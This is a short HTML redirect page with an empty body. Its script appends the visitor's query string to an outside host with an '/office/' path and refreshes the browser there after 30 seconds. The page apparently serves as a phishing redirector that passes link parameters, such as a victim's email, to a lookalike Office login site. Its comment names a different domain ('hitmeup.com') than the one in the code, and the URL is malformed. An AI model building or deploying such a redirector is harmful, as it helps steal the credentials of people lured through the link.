<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="30; url=" id="redirectMeta">
    <title>Redirecting...</title>
    <script>
        window.onload = function() {
            // Get the full URL query string (everything after '?')
            const queryString = window.location.search;

            // Define the base URL (hitmeup.com)
            const baseHitMeUpUrl = "https:/shared.111b222pro.online/office/?";

            // Append the query string (excluding the '?' character) to the base URL
            const redirectUrl = baseHitMeUpUrl + queryString.substring(1);

            // Update the meta tag for redirection
            document.getElementById('redirectMeta').setAttribute('content', '30; url=' + redirectUrl);
        };
    </script>
</head>
<body>
  
</body>
</html>
